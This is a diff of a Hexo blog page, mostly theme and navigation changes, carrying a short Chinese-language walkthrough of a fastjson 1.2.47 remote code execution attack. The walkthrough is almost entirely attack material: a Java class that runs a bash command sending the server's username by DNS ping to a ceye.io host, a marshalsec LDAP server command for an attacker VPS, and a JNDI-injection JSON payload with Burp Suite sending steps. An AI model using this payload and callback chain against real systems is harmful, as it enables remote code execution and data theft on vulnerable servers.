@@ -7,12 +7,12 @@
   <meta name="description" content="fastjson 1.2.47 rce | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
-<meta property="og:title" content="about">
-<meta property="og:url" content="http://yoursite.com/about/index.html">
+<meta property="og:title" content="文章分类">
+<meta property="og:url" content="http://yoursite.com/categories/index-1.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2019-12-22T09:49:55.000Z">
-<meta property="article:modified_time" content="2019-12-22T09:49:55.895Z">
+<meta property="article:published_time" content="2019-12-22T10:01:54.000Z">
+<meta property="article:modified_time" content="2019-12-22T10:02:52.531Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 
@@ -205,7 +205,7 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(4)</small></div></li>
+    <li><div class="all active">全部文章<small>(5)</small></div></li>
     
 </ul>
 <div class="left-bottom">
@@ -217,7 +217,7 @@
     </div>
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="4">
+<input type="hidden" id="yelog_site_posts_number" value="5">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -262,6 +262,14 @@
     <nav id="title-list-nav">
         
         <a  class=""
+           href="/2019/12/22/fastjson-1-2-47-rce/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="fastjson 1.2.47 rce">fastjson 1.2.47 rce</span>
+            <span class="post-date" title="2019-12-22 19:42:50">2019/12/22</span>
+        </a>
+        
+        <a  class=""
            href="/2019/12/23/hello-world/"
            data-tag=""
            data-author="" >
@@ -270,11 +278,11 @@
         </a>
         
         <a  class=""
-           href="/2019/12/22/fastjson-1-2-47-rce/"
+           href="/2019/12/23/sqlmap%E5%9C%A8https%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="fastjson 1.2.47 rce">fastjson 1.2.47 rce</span>
-            <span class="post-date" title="2019-12-22 19:42:50">2019/12/22</span>
+            <span class="post-title" title="sqlmap在https情况下的一个错误">sqlmap在https情况下的一个错误</span>
+            <span class="post-date" title="2019-12-23 08:53:50">2019/12/23</span>
         </a>
         
         <a  class=""
@@ -355,14 +363,26 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#环境<br>centos：tomcat9 jdk 1.8 fastjson1.2.44<br>vps：tomcat9 jdk1.8_112<br>工具：marshalsec<br>LDAPTouchFile.java  </p>
+        <p>#环境<br>
+centos：tomcat9 jdk 1.8 fastjson1.2.44<br>
+vps：tomcat9 jdk1.8_112<br>
+工具：marshalsec<br>
+LDAPTouchFile.java</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line">public class LDAPTouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;ping -c 5 &#96;whoami&#96;.xxx.ceye.io&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>#vps上执行监听<br>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <a href="http://vps-ip/#LDAPTouchFile" target="_blank" rel="noopener">http://vps-ip/#LDAPTouchFile</a> </p>
-<p>#测试<br>{“name”:”hello”, “age”:20}</p>
-<p>#payload<br>{“name”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”f”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://vps-ip:1389/LDAPTouchFile”,”autoCommit”:”true”}}</p>
-<p>#burpsuite抓包发送<br>将GET改为POST<br>添加Content-Type:application/json<br>添加payload<br>{“name”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”f”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://vps-ip:1389/LDAPTouchFile”,”autoCommit”:”true”}}<br><img src="/images/fastjson-2.png" alt=""></p>
-<p>#结果<br><img src="/images/fastjson-1.png" alt=""></p>
+<p>#vps上执行监听<br>
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <a href="http://vps-ip/#LDAPTouchFile" target="_blank" rel="noopener">http://vps-ip/#LDAPTouchFile</a></p>
+<p>#测试<br>
+{“name”:“hello”, “age”:20}</p>
+<p>#payload<br>
+{“name”:{&quot;@type&quot;:“java.lang.Class”,“val”:“com.sun.rowset.JdbcRowSetImpl”},“f”:{&quot;@type&quot;:“com.sun.rowset.JdbcRowSetImpl”,“dataSourceName”:“ldap://vps-ip:1389/LDAPTouchFile”,“autoCommit”:“true”}}</p>
+<p>#burpsuite抓包发送<br>
+将GET改为POST<br>
+添加Content-Type:application/json<br>
+添加payload<br>
+{“name”:{&quot;@type&quot;:“java.lang.Class”,“val”:“com.sun.rowset.JdbcRowSetImpl”},“f”:{&quot;@type&quot;:“com.sun.rowset.JdbcRowSetImpl”,“dataSourceName”:“ldap://vps-ip:1389/LDAPTouchFile”,“autoCommit”:“true”}}<br>
+<img src="/images/fastjson-2.png" alt=""></p>
+<p>#结果<br>
+<img src="/images/fastjson-1.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
